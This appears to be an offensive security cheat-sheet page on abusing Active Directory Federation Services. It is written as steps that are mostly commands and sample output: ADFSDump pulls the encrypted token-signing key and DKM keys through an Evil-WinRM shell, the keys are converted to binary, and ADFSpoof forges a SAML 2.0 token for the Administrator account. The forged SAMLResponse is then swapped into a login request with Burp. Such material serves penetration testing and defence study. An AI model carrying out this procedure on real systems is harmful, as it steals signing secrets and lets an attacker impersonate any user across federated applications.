---
title: "ADFS"
date: 2024-9-14
tags: ["SAML", "Token-Based Authentication", "ADFS", "Active Directory", "Windows", "Federation Services"]
---

### Abuse #1: Generate a SAML 2.0 token for some app

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Dump encrypted PFX and DKM key

```console
# With ADFS service account
.\ADFSDump.exe
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> .\ADFSDump.exe
    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec


## Extracting Private Key from Active Directory Store
[-] Domain is example.com
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7


[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1


## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
AAAAAQAAAA ...[SNIP]... EsNEUSTXxm
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.example.com/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.example.com
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.example.com:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.example.com:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
```

```console
# Alternative if error
.\ADFSDump.exe /user:<USER> /password:<PASSWORD> /domain:<DOMAIN> /server:<DC_IP>
```

<small>*Ref: [ADFSDump](https://github.com/mandiant/ADFSDump)*</small>

#### 2. Convert to binary blob

```console
# Copy private key(s)
echo '<PRIVATE_KEY>' | sed 's/-//g' | xxd -r -p > DkmKey.bin
```

```console {class="sample-code"}
$ echo '8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1' | sed 's/-//g' | xxd -r -p > DkmKey.bin
```

```console
# Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
echo -n '<B64_ENCRYPTED_TOKEN>' | base64 -d > EncryptedPfx.bin
```

```console {class="sample-code"}
$ echo -n 'AAAAAQAAAA ...[SNIP]... EsNEUSTXxm' | base64 -d > EncryptedPfx.bin
```

#### 3. Check which private key is correct

```console
# The correct key will not show error
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
```

```console {class="sample-code"}
$ python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec
```

<small>*Ref: [ADFSpoof](https://github.com/mandiant/ADFSpoof)*</small>

#### 4. Generate SAML 2.0 token

```console
# Copy info from ADFS dump
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <SERVER> saml2 --endpoint <SIGN_IN_ENDPOINT> --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid <SPOOF_USER>@<DOMAIN> --rpidentifier <IDENTIFIER> --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue><SPOOF_USER>@<DOMAIN></AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue><SPOOF_USER></AttributeValue></Attribute>' 
```

```console {class="sample-code"}
$ python3 ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s core.example.com saml2 --endpoint https://core.example.com:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid Administrator@example.com --rpidentifier https://core.example.com:8443 --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@example.com</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
```

#### 5. Modify request in BurpSuite

```console
+-------------------------------------------------------------+
| 1. Enable Intercept in Proxy Tab                            |
| 2. Sign In with the Web App                                 |
| 3. Click Forward until the POST request with 'SAMLResponse' |
| 4. Replace the payload and Forward                          |
| 5. Disable Intercept and profit                             |
+-------------------------------------------------------------+
```

```console {class="sample-code"}
POST /adfs/saml/postResponse HTTP/1.1
Host: core.example.com:8443
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6753
Origin: https://federation.example.com
Referer: https://federation.example.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Te: trailers
Connection: close

SAMLResponse=PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
```

{{< /tabcontent >}}
